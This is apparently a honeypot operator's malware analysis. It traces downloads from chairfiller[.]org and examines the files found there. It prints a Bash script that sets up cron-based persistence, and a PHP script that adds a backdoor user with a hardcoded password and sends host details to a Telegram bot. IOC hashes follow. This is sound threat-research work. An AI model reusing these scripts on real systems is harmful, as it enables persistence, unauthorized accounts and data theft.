### The story
I was looking at my honey pot logs using the following command.<br>
<br>
`cat cowrie.json* | jq '. | select(.eventid | contains("cowrie.session.file_download")) | .url' | grep -v "null" | sort | uniq -c | sort -bgr | head -n 10`
The command scrapes the log files and displays the top 10 URLS that were used to download files. 

Usually the top 10 contains IP's not domains. The last result caught my eye because it contained the domain name: http://chairfiller[.]org/smtp.

The first thing I did was use  the tool, Dirseach on the domain. This tool uses a list of popular file names and will check to see
if the file exists. 

<img src="https://i.imgur.com/aq4XhPX.png" alt="chairfiller[.]org dirsearch" width="200" height="250">


The Figure above shows the files and directories that were found by the tool. 
<ul>
  <li>/authorized_keys</li>
  <li>/a</li>
  <li>/echo</li>
  <li>/f</li>
  <li>/archive.zip</li>
  <li>/perl</li>
  <li>/phptest.php</li>
  <li>/setup</li>
  <li>/test</li>
</ul>  

The list above shows some of the more intresting files.<br><br><br>
<img src="https://i.imgur.com/cZDgh63.png" alt="chairfiller[.]org/a" width="175" height="200"><br>
The Figure above shows that when you visit `chairfiller[.]org/a` the visitor is shown the file system where there is a hidden directory named .b. 

<img src="https://i.imgur.com/gMnIksc.png" alt="chairfiller[.]org/a/.b" width="175" height="200">
<br>
The Figure above shows the contents of the `chairfiller[.]org/a/.b/` directory. The contents of the directory contains files for windows and linux based operating systems. 

One of the files in the directory is a file named autorun. 

```bash
#!/bin/sh
pwd > dir
dir=$(cat dir)
echo "* * * * * $dir/update >/dev/null 2>&1" > cron
crontab cron
crontab -l | grep update
echo "#!/bin/sh
if test -r $dir/pid; then
pid=\$(cat $dir/pid)
if \$(kill -CHLD \$pid >/dev/null 2>&1)
then
exit 0
fi
fi
cd $dir
./run &>/dev/null" > update
chmod u+x update

```
The Figure above shows the contents of the file located at `http://chairfiller.org/a/.b/autorun`.

The autorun Figure shown above is a Bash script. The first thing the script does create a new that will contain the machine's home directory file path. This file is named dir. Next the script creates a variable named dir. Whe $dir is called the script will use the cat command to read the contents of the dir file. After that variable is created the script will use the echo command to create a new cron job that will use the $dir variable created earlier to get the machines home path. The next line is where the script will add the cron to the crontab. 

The script use the the command `crontab -l` to list the machines cronjob.The script will also use the `grep` command to look for cronjobs that contain the string "update".



### echo
The script, echo can be found at `http://chairfiller[.]org/echo`. The scrip in written in PHP and uses the Telegram API to send data to the attackers. 
```php
<?php exec('useradd mails; echo "mails:badguys" | chpasswd; sudo adduser mails udo'); $sys = php_uname(); $lihat = system('curl ipecho.net/plain'); $corenya =system('nproc');$response = file_get_contents("https://api.telegram.org/bot165187481:AAFwnMlabSDcSfMe474hAEZht9sHdrCip2Y/sendMessage?chat_id=-463422282&text=Sfu vine : -> IP : ".$lihat." -> Core : ".$corenya." -> User : mails -> Pass : bdguys -> Uname : ".$sys); ?>
```
<br>
The snippet above shows the contents of echo. The first thing the PHP script does is add a new user named `mails` to the system. Next it uses echo to add the password `badguys` to the password file. The script uses the `chpasswd` command to change the password. The last thing it does to the user mails is give it sudo permissions. But I think they forget  the s on the sudo. 

Next the PHP code creates a variable named `$sys`. The variable uses PHP's `php_name()` method to return information about the system. The `lihat` variable uses PHP's system method to use curl to visit `ipecho.net/plain` which will return the IP address of the server. The next variable run the `nproc` command which will return the number of processing units that the system contains. 

The next part of the script contains the part where the attacker uses Telegram to send inforamtion about the infected computer to a certain Telegram channel.  

### IOC
<ul>
  <li>e4eda70e5c4daccdffb71ff79e4877bd57f81f80  echo</li>
  <li>a8ab84485735cec4e44c2f6db03d6f57c8533b4c  archive.zip</li>
  <li>24d99819577424c9b7eda952017988d119683c95  perl</li>
  <li>e417ab727cf42a1dcc180bb03fb05e1ecdcdb523  authorized_keys</li>
  <li>31794942f3fd3ce51ac2505ea7825e56f8848a70  setup</li>
  <li>b45ae5d8d3069ee7f880dd461c931fa711b6ad3d  f</li>
</ul>
